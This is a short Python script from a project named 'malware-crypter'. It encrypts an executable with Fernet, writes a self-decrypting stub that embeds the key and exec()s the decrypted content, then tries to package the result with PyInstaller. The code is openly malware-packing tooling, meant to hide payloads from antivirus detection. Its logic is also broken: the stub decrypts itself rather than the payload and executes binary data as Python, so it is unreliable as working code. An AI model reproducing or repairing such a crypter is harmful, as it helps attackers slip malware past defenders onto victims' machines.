from cryptography.fernet import Fernet

# Encrypt the software
key = Fernet.generate_key()
cipher = Fernet(key)
with open(r"C:\Users\John Emro\Documents\GitHub\malware-crypter\one_file\calculator.exe", "rb") as f:
    encrypted_data = cipher.encrypt(f.read())
with open(r"C:\Users\John Emro\Documents\GitHub\malware-crypter\one_file\encrypted_software.exe", "wb") as f:
    f.write(encrypted_data)

# Add decryption code to the encrypted software
decryption_code = '''
import os
from cryptography.fernet import Fernet
key = b'{}'
cipher = Fernet(key)
with open(os.path.basename(__file__), 'rb') as f:
    decrypted_data = cipher.decrypt(f.read())
with open(os.path.splitext(os.path.basename(__file__))[0], 'wb') as f:
    f.write(decrypted_data)
exec(open(os.path.splitext(os.path.basename(__file__))[0]).read())
'''.format(key.decode('utf-8'))

with open(r"C:\Users\John Emro\Documents\GitHub\malware-crypter\one_file\decryptor.py", "w") as f:
    f.write(decryption_code)

pathDecryptor = r"C:\Users\John Emro\Documents\GitHub\malware-crypter\one_file\decryptor.py"
pathEncryptedSoftware = r"C:\Users\John Emro\Documents\GitHub\malware-crypter\one_file\encrypted_software.exe"

# Modify the encrypted software to include the decryption code
import PyInstaller.__main__
PyInstaller.__main__.run([
    '--onefile',
    f'--add-data={pathDecryptor};.',
    f'{pathEncryptedSoftware}'
])